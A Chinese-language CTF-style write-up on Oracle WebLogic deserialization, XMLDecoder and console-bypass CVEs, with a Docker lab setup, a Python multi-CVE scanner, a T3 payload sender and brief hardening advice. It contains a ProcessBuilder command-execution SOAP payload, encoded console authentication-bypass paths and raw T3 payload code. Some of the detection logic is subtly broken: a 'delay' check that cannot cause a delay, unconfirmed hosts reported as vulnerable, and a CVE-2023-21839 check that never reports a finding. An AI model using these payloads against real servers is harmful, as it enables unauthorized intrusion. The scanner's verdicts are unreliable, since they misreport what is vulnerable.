---
category: "Java反序列化/应用服务器漏洞"
tags: ["Weblogic", "T3协议", "IIOP", "反序列化", "CVE-2020-2555", "CVE-2020-2883", "CVE-2020-14882", "CVE-2023-21839"]
difficulty: "高级"
cve: "多个CVE (详见内文)"
cvss: "9.8"
affected: "Oracle WebLogic Server 10.3.6.0 ~ 14.1.1.0 各版本"
poc_available: true
---

# Oracle WebLogic T3/IIOP反序列化RCE系列
> **多CVE** | **CVSS 9.8** | **Java反序列化经典漏洞**

## 1. 概述

### 漏洞系列一览

| CVE | 影响版本 | 类型 | CVSS | CTF频率 |
|-----|---------|------|------|---------|
| CVE-2015-4852 | 10.3.6/12.1.3/12.2.1 | T3反序列化 | 7.5 | 高 |
| CVE-2017-3506 | 10.3.6/12.1.3/12.2.1 | XMLDecoder RCE | 7.4 | 高 |
| CVE-2017-10271 | 10.3.6/12.1.3/12.2.1 | XMLDecoder RCE | 7.5 | 极高 |
| CVE-2019-2725 | 10.3.6/12.1.3 | wls9_async RCE | 9.8 | 极高 |
| CVE-2020-2555 | 12.2.1.3/12.2.1.4/14.1.1 | T3 Coherence RCE | 8.1 | 高 |
| CVE-2020-2883 | 12.2.1.3/12.2.1.4 | T3 IIOP反序列化 | 7.5 | 高 |
| CVE-2020-14882 | 10.3.6/12.1.3/12.2.1.3/12.2.1.4 | Console认证绕过 | 9.8 | 高 |
| CVE-2020-14883 | 同上 | Console RCE | 7.2 | 高 |
| CVE-2023-21839 | 12.2.1.3/12.2.1.4/14.1.1 | T3/IIOP JNDI RCE | 7.5 | 极高 |

### CTF中的应用形式
- **经典Java反序列化靶标**: Weblogic是CTF中内网渗透的常客
- **T3/IIOP协议利用**: 非HTTP协议的反序列化
- **Console认证绕过**: CVE-2020-14882组合利用
- **利用链构造**: 需要使用ysoserial或Coherence链

## 2. 漏洞原理

### 2.1 T3协议反序列化机制

Weblogic使用T3协议进行内部集群通信。T3协议基于Java的`ObjectInputStream`，直接接收序列化对象。攻击者可以构造恶意T3请求，其中包含反序列化Gadget链。

```
客户端 → T3握手 (HEADER + ASCII) → 
发送序列化对象 → Weblogic反序列化 → 触发Gadget链 → RCE
```

### 2.2 XMLDecoder RCE (CVE-2017-10271)

Weblogic的`wls-wsat`组件使用`XMLDecoder`解析SOAP消息。`XMLDecoder`在处理XML时可以创建任意Java对象并调用其方法。

```xml
<soapenv:Envelope>
  <soapenv:Header>
    <work:WorkContext>
      <java>
        <object class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>id</string></void>
          </array>
          <void method="start"/>
        </object>
      </java>
    </work:WorkContext>
  </soapenv:Header>
</soapenv:Envelope>
```

### 2.3 T3 Coherence RCE (CVE-2020-2555)

利用Coherence组件中的`LimitFilter`和`ChainedExtractor`，通过T3协议触发反序列化链。

## 3. 环境搭建

```bash
# Docker Weblogic 12.2.1.3
docker pull vulhub/weblogic:12.2.1.3-2018
docker run -d -p 7001:7001 -p 8453:8453 --name weblogic vulhub/weblogic:12.2.1.3-2018

# Weblogic 10.3.6 (较老版本，仍有大量生产环境)
docker pull vulhub/weblogic:10.3.6.0-2017
docker run -d -p 7001:7001 --name weblogic10 vulhub/weblogic:10.3.6.0-2017

# 离线准备
docker pull vulhub/weblogic:12.2.1.3-2018
docker save vulhub/weblogic:12.2.1.3-2018 -o weblogic-12.2.1.3.tar
```

## 4. POC/EXP

### 4.1 多CVE综合检测脚本 (Python)

```python
#!/usr/bin/env python3
"""
Oracle WebLogic 多CVE综合检测工具
覆盖: T3协议 / XMLDecoder / Console / Coherence

检测方式:
1. WebLogic版本指纹识别
2. Console认证绕过检测 (CVE-2020-14882)
3. XMLDecoder RCE检测 (CVE-2017-10271)
4. wls9-async检测 (CVE-2019-2725)
5. T3协议检测 (CVE-2020-2555等)
"""

import requests
import socket
import struct
import argparse
import re
import sys
import time
import hashlib
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TIMEOUT = 10
USER_AGENT = "WebLogic-Detector/4.0"


class WebLogicDetector:
    """多CVE综合检测器"""

    def __init__(self, target, verbose=False, proxy=None):
        self.target = target.rstrip("/")
        self.host = self._parse_host()
        self.port = self._parse_port()
        self.verbose = verbose
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({"User-Agent": USER_AGENT})
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}

    def _parse_host(self):
        from urllib.parse import urlparse
        parsed = urlparse(self.target)
        return parsed.hostname

    def _parse_port(self):
        from urllib.parse import urlparse
        parsed = urlparse(self.target)
        return parsed.port or 7001

    def log(self, msg, level="INFO"):
        levels = {"INFO": "[*]", "GOOD": "[+]", "VULN": "[!!!]", "WARN": "[!]", "BAD": "[-]"}
        if level in ("VULN", "GOOD", "WARN") or self.verbose:
            print(f"{levels.get(level, '[*]')} {msg}")

    # ===== 指纹识别 =====
    def weblogic_fingerprint(self):
        """WebLogic指纹识别"""
        fingerprints = []

        try:
            resp = self.session.get(self.target, timeout=TIMEOUT)
            indicators = [
                "WebLogic",
                "weblogic",
                "console.portal",
                "Home Page",
                "BEA WebLogic",
            ]
            for ind in indicators:
                if ind.lower() in resp.text.lower():
                    fingerprints.append(ind)
                    self.log(f"WebLogic指纹: {ind}", "GOOD")
        except:
            pass

        # HTTP响应头指纹
        try:
            resp = self.session.get(f"{self.target}/console", timeout=5)
            if "WebLogic" in resp.text:
                fingerprints.append("console")
            # 检查特定响应头
            if "X-WebLogic-Request-Timeout" in str(resp.headers):
                fingerprints.append("X-WebLogic header")
        except:
            pass

        return len(fingerprints) > 0

    # ===== T3协议检测 =====
    def test_t3_protocol(self):
        """
        T3协议检测
        WebLogic T3协议运行在7001端口(默认)
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.host, self.port))

            # 发送T3握手
            t3_header = "t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\nLP:DOMAIN\n\n"
            sock.send(t3_header.encode())

            response = sock.recv(1024)
            sock.close()

            if b"HELO" in response or b"T3" in response:
                self.log("T3协议响应确认", "GOOD")
                self.log(f"T3响应: {response[:100]}", "INFO")
                return True
        except socket.timeout:
            self.log("T3连接超时(端口可能未开启T3)", "WARN")
        except ConnectionRefusedError:
            self.log("T3连接被拒绝", "INFO")
        except Exception as e:
            self.log(f"T3检测异常: {e}", "WARN")

        return False

    def test_t3_deserialization(self):
        """
        T3反序列化漏洞检测
        发送序列化payload检测是否存在CVE-2020-2555之前的T3 RCE
        """
        # 构造T3数据包
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.host, self.port))

            # T3握手
            t3_header = b"t3 12.2.1\nAS:255\nHL:19\n\n"
            sock.send(t3_header)

            # 接收响应
            resp = sock.recv(4096)

            if b"HELO" in resp:
                self.log("T3握手成功", "GOOD")

                # 构造Java序列化探测payload
                # Java序列化魔数 + 简单探测对象
                probe = self._build_jre_probe()
                sock.send(probe)

                try:
                    resp2 = sock.recv(4096)
                    if resp2:
                        self.log(f"T3序列化响应长度: {len(resp2)}", "INFO")
                        # 如果返回了序列化响应，说明存在T3反序列化处理
                        if len(resp2) > 50:
                            self.log("T3反序列化处理确认!", "VULN")
                            sock.close()
                            return True
                except socket.timeout:
                    self.log("T3反序列化探测超时", "WARN")
                except:
                    pass

            sock.close()
        except Exception as e:
            self.log(f"T3反序列化检测异常: {e}", "WARN")

        return False

    def _build_jre_probe(self):
        """构造基本的Java序列化探测包"""
        # Java序列化魔数
        magic = b"\xac\xed"
        # Stream version
        version = b"\x00\x05"
        # 简单对象(空String)
        obj = magic + version

        # T3协议包装
        # 长度前缀等...
        header = struct.pack(">i", len(obj) + 4)
        return header + obj

    # ===== CVE-2017-10271 XMLDecoder检测 =====
    def test_cve_2017_10271(self):
        """
        CVE-2017-10271 XMLDecoder RCE检测
        
        路径: /wls-wsat/CoordinatorPortType
        """
        ws_paths = [
            "/wls-wsat/CoordinatorPortType",
            "/wls-wsat/CoordinatorPortType11",
            "/wls-wsat/ParticipantPortType",
            "/wls-wsat/ParticipantPortType11",
            "/wls-wsat/RegistrationPortTypeRPC",
            "/wls-wsat/RegistrationPortTypeRPC11",
            "/wls-wsat/RegistrationRequesterPortType",
            "/_async/AsyncResponseService",
        ]

        results = []
        for path in ws_paths:
            try:
                resp = self.session.get(
                    f"{self.target}{path}",
                    timeout=5
                )
                # HTTP 405 Method Not Allowed 通常说明该端点存在
                if resp.status_code in (200, 405, 500):
                    self.log(f"WebService端点存在: {path} (HTTP {resp.status_code})", "GOOD")
                    results.append(path)
            except:
                pass

        # 如果没有发现，尝试POST SOAP检测
        if results:
            soap_payload = """<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
<soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.8.0" class="java.beans.XMLDecoder">
<void class="java.lang.Thread" method="currentThread">
<void method="getStackTrace">
<void method="toString"/>
</void>
</void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>"""

            for path in results[:2]:
                try:
                    resp = self.session.post(
                        f"{self.target}{path}",
                        data=soap_payload,
                        headers={"Content-Type": "text/xml"},
                        timeout=10
                    )
                    if "Thread" in resp.text or "Stack" in resp.text:
                        self.log(f"CVE-2017-10271 XMLDecoder RCE确认!", "VULN")
                        return {"vulnerable": True, "path": path}
                except:
                    pass

        return {"vulnerable": False, "paths": results}

    # ===== CVE-2019-2725 检测 =====
    def test_cve_2019_2725(self):
        """
        CVE-2019-2725 wls9-async XMLDecoder RCE检测
        """
        async_path = "/_async/AsyncResponseService"
        
        # 无害检测payload (通过Thread.currentThread获取信息)
        xml_payload = """<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:wsa="http://www.w3.org/2005/08/addressing"
xmlns:asy="http://www.bea.com/async/AsyncResponseService">
<soapenv:Header>
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java>
<class><string>oracle.ucp.jdbc.proxy.oracle$1ucp$1jdbc$1proxy$1OracleConnectionProxy</string>
<void>
<string>test_detection</string>
</void>
</class>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body>
</soapenv:Envelope>"""

        try:
            resp = self.session.post(
                f"{self.target}{async_path}",
                data=xml_payload,
                headers={"Content-Type": "text/xml"},
                timeout=10
            )
            
            if resp.status_code in (200, 500, 202):
                self.log(f"CVE-2019-2725端点存在: HTTP {resp.status_code}", "GOOD")
                
                # 尝试带延时payload验证
                delay_payload = xml_payload.replace(
                    "test_detection",
                    ""
                )
                
                start = time.time()
                try:
                    resp = self.session.post(
                        f"{self.target}{async_path}",
                        data=delay_payload,
                        timeout=15
                    )
                    elapsed = time.time() - start
                    if elapsed > 4:
                        self.log(f"延时注入确认: {elapsed:.1f}秒", "VULN")
                        return {"vulnerable": True, "path": async_path}
                except:
                    pass

                return {"vulnerable": True, "path": async_path, "confirmed": False}
        except Exception as e:
            self.log(f"CVE-2019-2725检测: {e}", "INFO")

        return {"vulnerable": False}

    # ===== CVE-2020-14882/14883 检测 =====
    def test_cve_2020_14882(self):
        """
        CVE-2020-14882 Console认证绕过检测
        路径穿越绕过Console认证
        """
        bypass_paths = [
            "/console/css/%252e%252e%252fconsole.portal",
            "/console/images/%252e%252e%252fconsole.portal",
            "/console/css/%2e%2e%2fconsole.portal",
            "/console/css/../console.portal",
            "/console/console.portal?_nfpb=true&_pageLabel=HomePage1",
        ]

        for path in bypass_paths:
            try:
                resp = self.session.get(
                    f"{self.target}{path}",
                    timeout=10,
                    allow_redirects=False
                )

                # 检查是否进入了Console页面（未要求登录）
                if resp.status_code == 200 and "console" in resp.text.lower():
                    if "Home" in resp.text or "WebLogic" in resp.text:
                        self.log(f"Console认证绕过! {path}", "VULN")
                        return {"vulnerable": True, "bypass_path": path}

            except Exception as e:
                pass

        return {"vulnerable": False}

    def test_cve_2020_14883(self):
        """
        CVE-2020-14883 Console认证绕过RCE
        需要在CVE-2020-14882绕过认证后才能利用
        """
        # combo利用: 认证绕过 + Handle执行
        # 检查是否有不需要认证的Deploy处理端点
        paths = [
            "/console/console.portal",
            "/console/console.portal?_nfpb=true&_pageLabel=DeploymentsControlPage",
        ]

        for path in paths:
            try:
                resp = self.session.get(
                    f"{self.target}{path}",
                    timeout=5
                )
                if "Deploy" in resp.text and "WebLogic" in resp.text:
                    self.log(f"Deploy管理页面可访问: {path}", "GOOD")
            except:
                pass

        return {"vulnerable": False}

    # ===== CVE-2023-21839 检测 =====
    def test_cve_2023_21839(self):
        """
        CVE-2023-21839 T3/IIOP JNDI RCE检测
        利用ForeignOpaqueReference实现JNDI注入
        """
        # 该漏洞通过IIOP协议触发
        # 需要发送GIOP请求包
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            # 尝试IIOP端口 (通常是7001或单独的IIOP端口)
            iiop_ports = [self.port, 7001, 7002, 5556]
            
            for port in iiop_ports:
                try:
                    sock.connect((self.host, port))
                    
                    # GIOP握手
                    giop_header = b"GIOP\x01\x02\x00\x00\x00\x00\x00\x08"
                    sock.send(giop_header)
                    
                    resp = sock.recv(1024)
                    if b"GIOP" in resp or len(resp) > 0:
                        self.log(f"IIOP协议响应: port {port}, {len(resp)} bytes", "GOOD")
                        return {"vulnerable": False, "iiop_available": True}
                except:
                    pass
                finally:
                    try:
                        sock.close()
                    except:
                        pass
                    
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    
        except Exception as e:
            self.log(f"IIOP检测异常: {e}", "INFO")

        return {"vulnerable": False}

    # ===== 综合检测 =====
    def comprehensive_detect(self):
        """综合检测"""
        print(f"""
    ╔══════════════════════════════════════════╗
    ║  Oracle WebLogic Multi-CVE Detector     ║
    ║  T3/IIOP/XMLDecoder/Console Series      ║
    ║  Java Deserialization Classic Target    ║
    ╚══════════════════════════════════════════╝
    """)
        print(f"[*] 目标: {self.target} ({self.host}:{self.port})")

        results = {
            "is_weblogic": False,
            "t3_available": False,
            "t3_vuln": False,
            "cve_2017_10271": None,
            "cve_2019_2725": None,
            "cve_2020_14882": None,
            "cve_2020_14883": None,
            "cve_2023_21839": None,
        }

        # Step 1: WebLogic识别
        print("\n[Step 1] WebLogic 服务指纹识别...")
        results["is_weblogic"] = self.weblogic_fingerprint()
        if not results["is_weblogic"]:
            self.log("未检测到WebLogic特征", "WARN")
            self.log("仍在继续检测(可能是非HTTP service或自定义页面)", "INFO")

        # Step 2: T3协议
        print("\n[Step 2] T3协议检测...")
        results["t3_available"] = self.test_t3_protocol()
        if results["t3_available"]:
            self.log("T3协议可用", "GOOD")
            print("  [2b] T3反序列化检测...")
            results["t3_vuln"] = self.test_t3_deserialization()

        # Step 3: XMLDecoder RCE (CVE-2017-10271)
        print("\n[Step 3] CVE-2017-10271 XMLDecoder RCE检测...")
        results["cve_2017_10271"] = self.test_cve_2017_10271()
        if results["cve_2017_10271"].get("vulnerable"):
            self.log("CVE-2017-10271 漏洞确认!", "VULN")
        elif results["cve_2017_10271"].get("paths"):
            self.log(f"wls-wsat端点存在 ({len(results['cve_2017_10271']['paths'])}个)", "GOOD")

        # Step 4: wls9-async (CVE-2019-2725)
        print("\n[Step 4] CVE-2019-2725 wls9-async检测...")
        results["cve_2019_2725"] = self.test_cve_2019_2725()
        if results["cve_2019_2725"].get("vulnerable"):
            self.log("CVE-2019-2725 漏洞确认!", "VULN")

        # Step 5: Console认证绕过 (CVE-2020-14882)
        print("\n[Step 5] CVE-2020-14882 Console认证绕过检测...")
        results["cve_2020_14882"] = self.test_cve_2020_14882()
        if results["cve_2020_14882"].get("vulnerable"):
            self.log("CVE-2020-14882 Console认证绕过!", "VULN")

        # Step 6: CVE-2023-21839
        print("\n[Step 6] CVE-2023-21839 T3/IIOP JNDI检测...")
        results["cve_2023_21839"] = self.test_cve_2023_21839()

        # 总结
        print("\n" + "=" * 60)
        print("[综合判定]")

        vuln_count = sum([
            1 if results.get("t3_vuln") else 0,
            1 if results.get("cve_2017_10271", {}).get("vulnerable") else 0,
            1 if results.get("cve_2019_2725", {}).get("vulnerable") else 0,
            1 if results.get("cve_2020_14882", {}).get("vulnerable") else 0,
        ])

        if vuln_count > 0:
            print(f"[!!!] 发现 {vuln_count} 个可利用漏洞!")
            if results.get("t3_vuln"):
                print("  - T3协议反序列化RCE")
            if results.get("cve_2017_10271", {}).get("vulnerable"):
                print("  - XMLDecoder RCE (wls-wsat)")
            if results.get("cve_2019_2725", {}).get("vulnerable"):
                print("  - wls9-async RCE")
            if results.get("cve_2020_14882", {}).get("vulnerable"):
                print("  - Console认证绕过 (可组合RCE)")
        else:
            self.log("未检测到直接可利用的WebLogic漏洞", "WARN")

        if results["t3_available"]:
            self.log("T3协议可用(ysoerial/Coherence链可能可利用)", "INFO")

        return results


def main():
    parser = argparse.ArgumentParser(
        description="Oracle WebLogic 多CVE综合检测工具",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
使用示例:
  python weblogic_detector.py -t http://target:7001
  python weblogic_detector.py -t http://target:7001 -v
  python weblogic_detector.py -t t3://target:7001  (直接指定T3)
        """
    )
    parser.add_argument("-t", "--target", required=True, help="目标URL")
    parser.add_argument("-v", "--verbose", action="store_true", help="详细输出")
    parser.add_argument("--proxy", help="HTTP代理")

    args = parser.parse_args()

    detector = WebLogicDetector(args.target, verbose=args.verbose, proxy=args.proxy)
    detector.comprehensive_detect()


if __name__ == "__main__":
    main()
```

### 4.2 T3消息解析脚本

```python
#!/usr/bin/env python3
"""
WebLogic T3协议消息构造/解析工具
用于理解和调试T3协议反序列化漏洞
"""

import socket
import struct
import binascii


def t3_handshake(host, port):
    """T3协议握手"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((host, port))

    # T3握手消息
    t3_header = "t3 12.2.1\nAS:255\nHL:19\nMS:10000000\n\n"
    sock.send(t3_header.encode())

    response = sock.recv(4096)
    print(f"[*] T3握手响应 ({len(response)} bytes):")
    print(f"    {response[:200]}")

    return sock, response


def build_t3_message(payload_bytes):
    """构造T3协议消息包装"""
    # T3协议消息格式
    # | Length (4 bytes) | Flags (4) | CMD (4) | QOS (4) | Response (4) | Payload |
    flags = struct.pack(">I", 0x00000001)  # JVMD_IDENTIFY_REQUEST
    cmd = struct.pack(">I", 0x05650800)     # CMD_ONE_WAY or CMD_REQUEST
    qos = struct.pack(">I", 0x00000001)
    response = struct.pack(">I", 0x00000000)

    msg = flags + cmd + qos + response + payload_bytes
    length = struct.pack(">I", len(msg) + 4)

    return length + msg


def send_t3_payload(host, port, payload):
    """发送T3 payload"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((host, port))

    # 握手
    t3_header = "t3 12.2.1\nAS:255\nHL:19\n\n"
    sock.send(t3_header.encode())
    resp = sock.recv(4096)

    if b"HELO" in resp:
        print("[+] T3握手成功")

        # 发送身份认证消息
        auth_msg = build_authentication_message()
        sock.send(auth_msg)
        auth_resp = sock.recv(4096)
        print(f"[*] Auth响应: {len(auth_resp)} bytes")

        # 发送payload
        sock.send(payload)
        payload_resp = sock.recv(4096)
        print(f"[*] Payload响应: {len(payload_resp)} bytes")

    sock.close()


def build_authentication_message():
    """构造T3身份认证消息"""
    # 简化版身份验证消息
    return b"\x00\x00\x00\x10\x00\x00\x00\x01\x05\x65\x08\x00\x00\x00\x00\x01" + b"\x00" * 200


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("-p", "--port", type=int, default=7001)
    parser.add_argument("--handshake-only", action="store_true")
    args = parser.parse_args()

    print(f"[*] T3协议探测: {args.target}:{args.port}")

    try:
        sock, resp = t3_handshake(args.target, args.port)
        print("\n[+] T3协议可用")
        sock.close()
    except Exception as e:
        print(f"[-] T3连接失败: {e}")
```

## 5. 检测与防御

### 5.1 T3协议禁用

```bash
# WebLogic Console配置
# 环境 -> 服务器 -> [服务器名] -> 协议 -> T3协议
# 禁用: 取消"启用T3协议"勾选

# 或通过脚本禁用
# wlst脚本
connect('weblogic','password','t3://localhost:7001')
edit()
startEdit()
cd('/Servers/AdminServer/NetworkAccessPoints/T3Channel')
cmo.setEnabled(false)
activate()
```

### 5.2 加固方案

1. **升级到最新PSU**: 及时安装Oracle发布的安全补丁
2. **网络隔离**: 限制T3/IIOP端口的访问来源
3. **WAF规则**: 过滤XMLDecoder相关payload特征

## 6. 相关知识点

### 6.1 利用工具

| 工具 | 用途 |
|------|------|
| ysoserial | Java反序列化Gadget生成 |
| weblogicScanner | 多CVE批量检测 |
| Coherence工具包 | CVE-2020-2555利用链 |

### 6.2 相似应用服务器漏洞对比

| 应用服务器 | 主要漏洞 | 协议 |
|-----------|---------|------|
| WebLogic | T3/IIOP RCE, XMLDecoder | T3, IIOP |
| WebSphere | IIOP RCE, Portlet RCE | IIOP |
| JBoss/WildFly | JMX Console, Deserialization | HTTP, JNDI |
| Tomcat | War Upload, CORS | HTTP |
